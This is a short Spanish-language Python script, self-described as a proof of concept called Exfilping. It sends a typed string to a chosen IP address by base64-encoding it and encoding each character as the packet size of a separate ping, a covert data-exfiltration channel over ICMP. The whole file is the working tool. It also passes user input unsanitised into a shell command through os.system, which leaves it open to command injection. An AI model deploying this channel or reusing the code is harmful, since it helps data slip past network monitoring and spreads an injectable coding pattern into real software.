import base64
import os

def generar_diccionario_base64():
    caracteres_base64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    diccionario_base64 = {}
    for i, caracter in enumerate(caracteres_base64, start=1):
        diccionario_base64[caracter] = i
    return diccionario_base64

def realizar_ping(direccion_ip, tamano):
    comando_ping = f"ping -c 1 -s {tamano} {direccion_ip}"
    resultado = os.system(comando_ping)
    return resultado

def main():
    print ("Exfilping v. 0.1 - Prueba de concepto - github.com/disketteomelette")
    cadena = input("Ingrese la cadena a enviar: ")
    direccion_ip = input("Ingrese la dirección IP a la que enviar el mensaje: ")
    diccionario_base64 = generar_diccionario_base64()
    cadena_codificada = base64.b64encode(cadena.encode()).decode()
    print("\nNúmeros asignados a cada caracter en la cadena codificada:")
    for caracter in cadena_codificada:
        if caracter in diccionario_base64:
            numero = diccionario_base64[caracter]
            print(f"{caracter}: {numero}")
            resultado_ping = realizar_ping(direccion_ip, numero)
            print(f"Resultado del ping para el carácter '{caracter}': {resultado_ping}")
    print("Fin")

if __name__ == "__main__":
    main()